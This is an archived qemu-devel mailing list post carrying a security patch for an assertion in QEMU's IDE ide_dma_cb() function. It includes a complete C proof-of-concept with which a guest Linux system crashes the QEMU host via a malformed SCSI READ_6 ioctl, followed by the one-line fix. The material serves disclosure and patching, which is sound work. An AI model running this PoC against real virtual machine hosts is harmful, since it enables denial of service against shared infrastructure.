<!-- MHonArc v2.6.19+ -->
<!--X-Subject: [Qemu&#45;devel] [QEMU&#45;SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest -->
<!--X-From-R13: Oyrknaqre Bbcbi &#60;nyrk.cbcbiNyvahk.pbz> -->
<!--X-Date: Fri, 05 Jul 2019 10:42:25 &#45;0400 -->
<!--X-Message-Id: 1562335669&#45;10127&#45;1&#45;git&#45;send&#45;email&#45;alex.popov@linux.com -->
<!--X-Content-Type: text/plain -->
<!--X-Head-End-->
<!doctype html public "-//W3C//DTD HTML//EN">
<html>
<head>
<title>[Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to preve</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>
<center>
<table border=0 cellspacing=2 cellpadding=0 bgcolor="#000000">
<tr><td><table border=0 bgcolor="#FFFFCC">
<tr><td><big><b>qemu-devel</b></big></td></tr></table></tr></table>
<div class="nowrap">
<small>[<a href="../"
>Top</a>][<a href="/archive/html">All Lists</a>]</small>
</div>
<form method="get" action="/archive/cgi-bin/namazu.cgi">
<input type="text" name="query" size="30">
<input type="submit" name="submit" value="Search">
<input type="hidden" name="idxname" value="qemu-devel">
<a href="/archive/cgi-bin/namazu.cgi?idxname=qemu-devel">Advanced</a>
</form>

</center>
<!--X-Body-Begin-->
<!--X-User-Header-->
<!--X-User-Header-End-->
<!--X-TopPNI-->
<hr>
[<a href="msg01650.html">Date Prev</a>][<a href="msg01652.html">Date Next</a>][<a href="msg01634.html">Thread Prev</a>][<a href="msg01650.html">Thread Next</a>][<a
href="index.html#01651">Date Index</a>][<a
href="threads.html#01651">Thread Index</a>]

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h2>[Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to preve</h2>
<hr>
<table border=0>
<tbody>
<tr>
<td align="right" valign="top">
<b>From</b>: </td>
<td align="left">
Alexander Popov</td>
</tr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->

<tr>
<td align="right" valign="top">
<b>Subject</b>: </td>
<td align="left">
[Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</td>
</tr>

<tr>
<td align="right" valign="top">
<b>Date</b>: </td>
<td align="left">
Fri,  5 Jul 2019 17:07:49 +0300</td>
</tr>

</tbody>
</table>
<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre>This assertion was introduced in the commit a718978ed58a in July 2015.
It implies that the size of successful DMA transfers handled in
ide_dma_cb() should be multiple of 512 (the size of a sector).

But guest systems can initiate DMA transfers that don't fit this
requirement. Let's improve the assertion to prevent qemu DoS from quests.

PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
command and crash qemu:

#include &lt;stdio.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;scsi/scsi.h&gt;
#include &lt;scsi/scsi_ioctl.h&gt;

#define CMD_SIZE 2048

struct scsi_ioctl_cmd_6 {
        unsigned int inlen;
        unsigned int outlen;
        unsigned char cmd[6];
        unsigned char data[];
};

int main(void)
{
        intptr_t fd = 0;
        struct scsi_ioctl_cmd_6 *cmd = NULL;

        cmd = malloc(CMD_SIZE);
        if (!cmd) {
                perror(&quot;[-] malloc&quot;);
                return 1;
        }

        memset(cmd, 0, CMD_SIZE);
        cmd-&gt;inlen = 1337;
        cmd-&gt;cmd[0] = READ_6;

        fd = open(&quot;/dev/sg0&quot;, O_RDONLY);
        if (fd == -1) {
                perror(&quot;[-] opening sg&quot;);
                return 1;
        }

        printf(&quot;[+] sg0 is opened\n&quot;);

        printf(&quot;[.] qemu should break here:\n&quot;);
        fflush(stdout);
        ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
        printf(&quot;[-] qemu didn't break\n&quot;);

        free(cmd);

        return 1;
}

Signed-off-by: Alexander Popov &lt;address@hidden&gt;
---
 hw/ide/core.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/hw/ide/core.c b/hw/ide/core.c
index 6afadf8..304fe69 100644
--- a/hw/ide/core.c
+++ b/hw/ide/core.c
@@ -868,7 +868,7 @@ static void ide_dma_cb(void *opaque, int ret)
 
     sector_num = ide_get_sector(s);
     if (n &gt; 0) {
-        assert(n * 512 == s-&gt;sg.size);
+        assert(n == s-&gt;sg.size / 512);
         dma_buf_commit(s, s-&gt;sg.size);
         sector_num += n;
         ide_set_sector(s, sector_num);
-- 
2.7.4



</pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<form method="post" action="/mp/yyz.py" enctype="multipart/form-data">
<input type="hidden" name="a" value="alex.popov">
<input type="hidden" name="b" value="[Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest">
<input type="hidden" name="d" value="1562335669-10127-1-git-send-email-alex.popov@linux.com">
<input type="hidden" name="c" value="linux.com">
<center>reply via email to<br><input type="submit" value=" Alexander Popov "></center>
</form>
<hr>
<table width="100%">
<tr><td align="left">[Prev in Thread]</td>
<td align="center"><b>Current Thread</b></td>
<td align="right">[<a href="msg01650.html">Next in Thread</a>]</td></tr></table>
<ul>
<li><font color="#666666"><strong>[Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</strong>,
<em>Alexander Popov</em></font>&nbsp;<b>&lt;=</b>
<ul>
<li><b><a name="01650" href="msg01650.html">Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></b>, <i>Alexander Popov</i>, <tt>2019/07/05</tt>
</li>
<li><b><a name="03354" href="msg03354.html">Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></b>, <i>Alexander Popov</i>, <tt>2019/07/15</tt>
<ul>
<li><b><a name="03736" href="msg03736.html">Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></b>, <i>Kevin Wolf</i>, <tt>2019/07/16</tt>
<ul>
<li><b><a name="03817" href="msg03817.html">Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></b>, <i>John Snow</i>, <tt>2019/07/16</tt>
<li><b><a name="03869" href="msg03869.html">Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></b>, <i>P J P</i>, <tt>2019/07/16</tt>
</li>
</li>
</ul>
</li>
</ul>
</li>
<li><b><a name="05834" href="msg05834.html">Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></b>, <i>John Snow</i>, <tt>2019/07/25</tt>
<ul>
<li><b><a name="06169" href="msg06169.html">Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></b>, <i>Alexander Popov</i>, <tt>2019/07/26</tt>
</li>
</ul>
</li>
</ul>
</li>
</ul>

<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<ul>
<li>Prev by Date:
<strong><a href="msg01650.html">Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></strong>
</li>
<li>Next by Date:
<strong><a href="msg01652.html">[Qemu-devel] [Bug 1835477] Re: Converting qcow2 to vmdk on MacOSX results in a non-bootable image</a></strong>
</li>
<li>Previous by thread:
<strong><a href="msg01634.html">[Qemu-devel] [PATCH v15 0/7] virtio pmem driver</a></strong>
</li>
<li>Next by thread:
<strong><a href="msg01650.html">Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></strong>
</li>
<li>Index(es):
<ul>
<li><a href="index.html#01651"><strong>Date</strong></a></li>
<li><a href="threads.html#01651"><strong>Thread</strong></a></li>
</ul>
</li>
</ul>

<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</body>
</html>
